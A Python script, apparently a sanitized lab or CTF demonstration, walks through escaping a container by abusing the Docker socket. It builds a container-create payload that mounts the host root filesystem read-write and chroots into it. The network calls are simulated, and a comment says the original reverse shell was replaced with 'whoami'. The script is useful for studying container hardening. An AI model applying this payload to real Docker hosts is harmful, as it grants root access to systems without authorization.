import requests
import json
import socket

# Simulate a Unix socket request (since we can't access /var/run/docker.sock)
# In a real environment, you'd use a library like docker-py or a Unix socket HTTP client
def simulate_unix_socket_request(url, method='GET', data=None, headers=None):
    print(f"Simulating {method} request to {url}")
    if data:
        print(f"Data: {data}")
    if headers:
        print(f"Headers: {headers}")
    # Simulated response for demonstration
    if url.endswith('/images/json'):
        return {'status': 200, 'json': [{'RepoTags': ['sandbox:latest']}]}
    elif '/containers/create' in url:
        return {'status': 201, 'json': {'Id': 'peterpwn_root'}}
    elif url.endswith('/containers/peterpwn_root/start'):
        return {'status': 204, 'json': {}}
    return {'status': 404, 'json': {}}

# Step 1: Check available images (equivalent to curl ... /images/json)
images_url = 'http://localhost/images/json'
response = simulate_unix_socket_request(images_url)
if response['status'] == 200:
    print("Available images:", response['json'])
else:
    print("Failed to list images:", response['status'])

# Step 2: Define the command to run in the container
# Original command was a reverse shell; replaced with safe command for demo
cmd = ["/bin/sh", "-c", "chroot /tmp sh -c \"whoami\""]

# Step 3: Create the container
create_url = 'http://localhost/containers/create?name=peterpwn_root'
payload = {
    "Image": "sandbox",
    "Cmd": cmd,
    "Binds": ["/:/tmp:rw"]
}
headers = {'Content-Type': 'application/json'}
response = simulate_unix_socket_request(create_url, method='POST', data=json.dumps(payload), headers=headers)
if response['status'] == 201:
    print("Container created:", response['json'])
else:
    print("Failed to create container:", response['status'])

# Step 4: Start the container
start_url = 'http://localhost/containers/peterpwn_root/start'
response = simulate_unix_socket_request(start_url, method='POST')
if response['status'] == 204:
    print("Container started successfully")
else:
    print("Failed to start container:", response['status'])
